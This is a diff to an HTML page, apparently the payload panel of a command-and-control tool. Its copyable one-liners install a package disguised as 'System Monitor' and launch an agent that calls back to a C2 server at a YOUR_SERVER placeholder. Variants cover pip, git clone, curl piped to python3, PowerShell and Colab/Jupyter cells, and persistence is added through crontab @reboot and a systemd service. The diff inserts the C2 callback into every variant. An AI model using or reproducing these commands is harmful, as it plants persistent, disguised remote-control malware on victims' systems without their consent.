@@ -140,19 +140,20 @@
     <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px">
       <div class="quick-ref-card">
         <div class="qr-title">🐍 pip install from GitHub</div>
-        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && python -m system_monitor &</div>
+        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
         <p style="font-size:11px;color:var(--text-dim);margin-top:8px">Легитимная установка System Monitor</p>
       </div>
       <div class="quick-ref-card">
         <div class="qr-title">📦 git clone + run</div>
-        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && python3 /tmp/sysmon/agent.py &</div>
+        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && cd /tmp/sysmon && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
         <p style="font-size:11px;color:var(--text-dim);margin-top:8px">Клонирование репозитория и запуск</p>
       </div>
       <div class="quick-ref-card">
         <div class="qr-title">📝 Python Cell (Colab)</div>
         <div class="payload-code compact" style="white-space:pre-wrap;font-size:11px"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!pip install git+https://github.com/GaredBerns/system-monitor.git
-import subprocess
-subprocess.Popen(['python', '-m', 'run_unified'])</div>
+import os, subprocess
+os.environ['C2_URL'] = 'http://YOUR_SERVER:5000'
+subprocess.Popen(['python', '-m', 'src.agents.universal'])</div>
         <p style="font-size:11px;color:var(--text-dim);margin-top:8px">Для Jupyter/Colab notebook cells</p>
       </div>
     </div>
@@ -171,16 +172,16 @@ subprocess.Popen(['python', '-m', 'run_unified'])</div>
     </p>
 
     <h4 class="section-label">pip install (Linux/macOS):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && python -m system_monitor &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
 
     <h4 class="section-label">pip install (Windows):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && python -m system_monitor</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && set C2_URL=http://YOUR_SERVER:5000 && python -m src.agents.universal</div>
 
     <h4 class="section-label">git clone + run:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && python3 /tmp/sysmon/agent.py &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && cd /tmp/sysmon && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
 
     <h4 class="section-label">With crontab persistence:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && (crontab -l 2>/dev/null; echo "@reboot python -m system_monitor >/dev/null 2>&1 &") | crontab - && python -m system_monitor &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && (crontab -l 2>/dev/null; echo "@reboot C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal >/dev/null 2>&1 &") | crontab - && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
 
     <h4 class="section-label">With systemd service:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git
@@ -189,7 +190,8 @@ sudo tee /etc/systemd/system/sysmon.service > /dev/null <<EOF
 Description=System Monitor
 After=network.target
 [Service]
-ExecStart=/usr/bin/python3 -m system_monitor
+Environment="C2_URL=http://YOUR_SERVER:5000"
+ExecStart=/usr/bin/python3 -m src.agents.universal
 Restart=always
 [Install]
 WantedBy=multi-user.target
@@ -206,10 +208,10 @@ sudo systemctl daemon-reload && sudo systemctl enable --now sysmon</div>
   </div>
   <div class="body">
     <h4 class="section-label">pip install from GitHub:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && python -m system_monitor &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
     
     <h4 class="section-label">curl from GitHub raw:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL https://raw.githubusercontent.com/GaredBerns/system-monitor/main/agent.py | python3 &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL https://raw.githubusercontent.com/GaredBerns/system-monitor/main/agent.py | C2_URL=http://YOUR_SERVER:5000 python3 &</div>
   </div>
 </div>
 
@@ -221,10 +223,10 @@ sudo systemctl daemon-reload && sudo systemctl enable --now sysmon</div>
   </div>
   <div class="body">
     <h4 class="section-label">pip install from GitHub:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && python -m system_monitor</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && set C2_URL=http://YOUR_SERVER:5000 && python -m src.agents.universal</div>
     
     <h4 class="section-label">PowerShell:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -c "pip install git+https://github.com/GaredBerns/system-monitor.git; python -m system_monitor"</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -c "$env:C2_URL='http://YOUR_SERVER:5000'; pip install git+https://github.com/GaredBerns/system-monitor.git; python -m src.agents.universal"</div>
   </div>
 </div>
 
@@ -237,8 +239,9 @@ sudo systemctl daemon-reload && sudo systemctl enable --now sysmon</div>
   <div class="body">
     <h4 class="section-label">Notebook Cell:</h4>
     <div class="payload-code" style="white-space:pre-wrap"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!pip install git+https://github.com/GaredBerns/system-monitor.git
-import subprocess
-subprocess.Popen(['python', '-m', 'run_unified'])</div>
+import os, subprocess
+os.environ['C2_URL'] = 'http://YOUR_SERVER:5000'
+subprocess.Popen(['python', '-m', 'src.agents.universal'])</div>
   </div>
 </div>
 
